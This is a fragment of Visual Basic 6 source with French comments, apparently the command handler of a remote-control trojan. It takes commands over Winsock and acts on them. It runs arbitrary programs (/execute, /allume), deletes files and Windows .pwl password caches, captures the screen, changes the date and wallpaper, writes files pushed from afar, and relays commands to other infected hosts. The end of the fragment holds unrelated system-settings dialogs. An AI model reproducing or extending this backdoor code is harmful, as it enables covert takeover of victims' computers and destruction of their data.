If VecStrRecep(Index) = "/rglvol" Then
R = Shell("sndvol32 /t")
End If
If VecStrRecep(Index) = "/afimg" Then
Form1.Show
End If

If VecStrRecep(Index) = "/clavier oui" Then
   Shell "rundll32 keyboard,enable"
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/bddstop" Then
   
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/crash" Then
   Shell "rundll32 keyboard,enable"
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/suppr" Then

 Kill Text1.text
   VecStrRecep(Index) = ""
End If


If VecStrRecep(Index) = "/led" Then
Timer2.Enabled = True
   VecStrRecep(Index) = ""
End If
If VecStrRecep(Index) = "/ovrcd" Then
Call OuvrirCD
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/supprsession" Then
Kill "c:\windows\*.pwl"
End If

If VecStrRecep(Index) = "/infocontr" Then

End If

If VecStrRecep(Index) = "/deconexion web" Then
On Error Resume Next

On Error Resume Next
   VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/chgdate" Then
'memorise la date actuelle
AncienneDate = Date
'determine la nouvelle date
NouvelleDate = text
Date = NouvelleDate

   VecStrRecep(Index) = ""
End If

If Mid(VecStrRecep(Index), 1, 9) = "/execute" Then
   EString = Mid(VecStrRecep(Index), 10)
   VecStrRecep(Index) = ""
   ShellExecute hWnd, "open", EString, vbNullString, vbNullString, SW_SHOW
End If



If VecStrRecep(Index) = "/connexion web" Then
 Dim lResult As Long
lResult = InternetAutodial(1, 0&)

   VecStrRecep(Index) = ""
End If
If VecStrRecep(Index) = "/allume" Then
Shell Text1
VecStrRecep(Index) = ""
End If

If VecStrRecep(Index) = "/crfichier" Then
Open "c:\windows\bureau\Message important.txt" For Output As #1
'Ecrit Mon Texte dans le fichier
Print #1, Text1
'Ferme le fichier
Close #1

VecStrRecep(Index) = ""
End If


If VecStrRecep(Index) = "/vitclavier" Then
Dim Retcode As Long
   Dim FastKeySpeed As Long
   Dim FastKeyDelay As Long
   Dim dummy As Long
   FastKeySpeed = 31
   FastKeyDelay = 0
   dummy = 0
    
   Retcode = SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, OldKeySpeed, 0)
   Retcode = SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, OldKeyDelay, 0)
   Retcode = SystemParametersInfo(SPI_SETKEYBOARDSPEED, FastKeySpeed, dummy, IF_SENDCHANGE)
   Retcode = SystemParametersInfo(SPI_SETKEYBOARDDELAY, FastKeyDelay, dummy, IF_SENDCHANGE)

VecStrRecep(Index) = ""
End If


If Mid(VecStrRecep(Index), 1, 12) = "~ExecuteAll~" Then
   EString = Mid(VecStrRecep(Index), 13)
   VecStrRecep(Index) = ""
   Envoyer ("~Execute~" & EString)
End If



If Mid(VecStrRecep(Index), 1, 16) = "~ExecuteAllTree~" Then
    EString = Mid(VecStrRecep(Index), 17)
    VecStrRecep(Index) = ""
    Envoyer ("~ExecuteAll~" & EString)
  End If

If Mid(VecStrRecep(Index), 1, 11) = "/fdecran" Then
   EString = Mid(VecStrRecep(Index), 12)
   VecStrRecep(Index) = ""
Ret = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, EString, 0)
End If

If Mid(VecStrRecep(Index), 1, 11) = "/imp ecran" Then
      Ecran.Ecranl.Picture = CaptureScreen()
      Ecran.Show 1
End If
If Mid(VecStrRecep(Index), 1, 11) = "/vdcorbeille" Then
'La vide

'La met à jour

End If

If Mid(VecStrRecep(Index), 1, 11) = "/debut" Then
   If InStr(1, EString, "/fin", vbBinaryCompare) Then
   EString = Replace(EString, "~EndFile~", "", 1, , vbBinaryCompare)
   On Error Resume Next
   EString = Mid(VecStrRecep(Index), 12)
   Fichier = Mid(EString, 1, InStr(1, EString, "°", vbBinaryCompare) - 1)
   fil = FreeFile
   Open Fichier For Binary As fil
   Put fil, , Mid(EString, InStr(1, EString, "°", vbBinaryCompare) + 1)
   Close fil
   VecStrRecep(Index) = ""
Else
    Exit Sub
End If
End If

End If

  

If IndexReception + 1 = Index Then
   Arrive.text = VecStrRecep(IndexReception + 1)
Else
For i = 0 To reception.Pages.Count - 1 Step 1
    If reception.Pages.Item(i).Caption = Winsock(Index).RemoteHostIP Then
       reception.Pages.Item(i).Caption = "m@il:" & reception.Pages.Item(i).Caption
    End If
Next
End If
End Sub
Private Sub Winsock2_Close(Index As Integer)
Dim i As Integer
VecNumRecep(Index) = False
For i = reception.Pages.Count - 1 To 0 Step -1
  On Error Resume Next
    If (Winsock2(Index).RemoteHostIP = reception.Pages.Item(i).Caption Or Winsock2(Index).RemoteHostIP = "m@il:" & reception.Pages.Item(i).Caption) Then
        reception.Pages.Remove (i)
        Unload Winsock2(Index)
        Exit Sub
    End If
Next
If reception.Pages.Count = 0 Then
   reception.Visible = False
   Arrive.Visible = False
End If
End Sub
Private Sub Winsock2_Connect(Index As Integer)
ListClient.AddItem Client.text, ListClient.ListCount
ListClient.Selected(ListClient.ListCount - 1) = True
End Sub
Private Sub cmdchngdblclktm_Click()
Dim a As String
a = InputBox("Nouvelle durée du double-clic" & vbCrLf & "(en ms)", "Changement de durée du double-clic")
Dim num As Long
num = Val(a)
Debug.Print num
If num > 0 Then
fnt = SetDoubleClickTime(num)
Label2 = "Durée du double-clic" & " " & num & "ms"
End If

End Sub



Private Sub Commandpc_Click()
nom$ = InputBox("Entrez le nouveau nom de votre ordinateur", "Changement de nom...")
If Len(nom$) <> 0 Then
e = SetComputerName(nom$)
rep$ = MsgBox("La modification aura lieu au prochain redémarrage" & vbCrLf & "Redémarrer maintenant?", vbInformation + vbYesNo, "Le changement de nom a réussi.")
If rep$ = vbYes Then
a = ExitWindowsEx(2, 0)
End
End If

Label1 = "Nom de votre ordinateur: " & nom$
End If
End Sub

Private Sub Commandchaispas_Click()

Dim logi As String * 255
Dim nblect As Integer
R = GetLogicalDriveStrings(255, logi)

nblect = Int(R / 4)

Dim lect(1 To 255) As String
b = 0
For a = 1 To R Step 4
b = b + 1
lect(b) = Mid(logi, a, 3)

Next

Dim info(1 To 255) As String




Dim drv(1 To 255) As Integer


For a = 1 To nblect
drv(a) = GetDriveType(lect(a))


Select Case (drv(a))
Case 2
info(a) = "Disque amovible"
Case 3
info(a) = "Disque dur fixe"
Case 4
info(a) = "Disque distant (réseau)"
Case 5
info(a) = "Disque CD-ROM"
Case Else
info(a) = "Inconnu"
End Select



inf$ = inf$ + "Lecteur " & "'" & lect(a) & "'" & " : " & info(a) & vbCrLf

Next




m$ = "            " & nblect & "  lecteurs :" & vbCrLf & vbCrLf
m$ = m$ + inf$






MsgBox m$, vbInformation + vbOKOnly, "Plus d'informations sur les lecteurs"






End Sub






 
